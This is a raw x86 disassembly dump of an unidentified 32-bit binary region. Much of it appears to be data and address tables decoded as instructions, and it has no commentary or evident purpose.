  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	mov    esp,0xa67f1e71
  433a5d:	retf   0x4511
  433a60:	cmp    DWORD PTR [ecx+eiz*4+0x76],0x8
  433a65:	imul   ebp,DWORD PTR [ebx+0x1b69],0x0
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
